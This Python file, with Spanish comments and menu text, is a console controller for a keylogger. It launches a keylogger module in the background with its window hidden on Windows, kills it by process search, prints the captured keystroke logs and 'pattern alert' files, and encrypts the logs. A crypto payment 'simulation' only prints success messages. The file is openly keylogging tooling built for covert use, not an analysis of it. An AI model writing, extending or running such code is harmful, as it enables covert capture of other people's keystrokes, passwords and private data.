import subprocess
import sys
import os

def start_logger():
    #keylogger en segundo plano
    subprocess.Popen([sys.executable, "-m", "keylogger.core"],
                     creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)


def stop_logger():
    # Detiene procesos de keylogger
    try:
        # Busca procesos keylogger en ejecución
        result = subprocess.check_output(["pgrep", "-f", "keylogger/core.py"]).split()
        for pid in result:
            os.kill(int(pid), 9)
        print("Keylogger detenido.")
    except subprocess.CalledProcessError:
        print("No se encontró keylogger en ejecución.")


def view_logs():
    path = os.path.join("logs", "log.txt")
    if os.path.exists(path):
        with open(path, "r") as f:
            print(f.read())
    else:
        print("No hay logs disponibles. Inicia el keylogger primero.")


def view_alerts():
    path = os.path.join("logs", "patterns_detected.txt")
    if os.path.exists(path):
        with open(path, "r") as f:
            print(f.read())
    else:
        print("No hay alertas disponibles.")


def encrypt_logs():
    os.system(f"{sys.executable} log_encryptor.py")


def simulate_payment():
    print("=== Simulación de Pago con Cripto ===")
    print("1. Enviar pago")
    print("2. Recibir pago")
    choice = input("Selecciona una opción: ")
    if choice == "1":
        address = input("Dirección de destino: ")
        amount = input("Cantidad a enviar: ")
        currency = input("Moneda (e.g., BTC, ETH): ")
        print(f"Enviando {amount} {currency} a {address}...")
        print("Pago enviado correctamente.")
    elif choice == "2":
        address = input("Tu dirección para recibir: ")
        amount = input("Cantidad a recibir: ")
        currency = input("Moneda (e.g., BTC, ETH): ")
        print(f"Esperando {amount} {currency} en {address}...")
        print("Pago recibido correctamente.")
    else:
        print("Opción no válida.")


def main():
    while True:
        print("\nMenú Principal:")
        print("1. Iniciar keylogger")
        print("2. Detener keylogger")
        print("3. Ver registros")
        print("4. Ver alertas de patrones")
        print("5. Simular pago con cripto")
        print("6. Cifrar registros")
        print("0. Salir")
        choice = input("Selecciona una opción: ")

        if choice == "1":
            start_logger()
        elif choice == "2":
            stop_logger()
        elif choice == "3":
            view_logs()
        elif choice == "4":
            view_alerts()
        elif choice == "5":
            simulate_payment()
        elif choice == "6":
            encrypt_logs()
        elif choice == "0":
            print("Saliendo...")
            break
        else:
            print("Opción no válida.")

if __name__ == "__main__":
    main()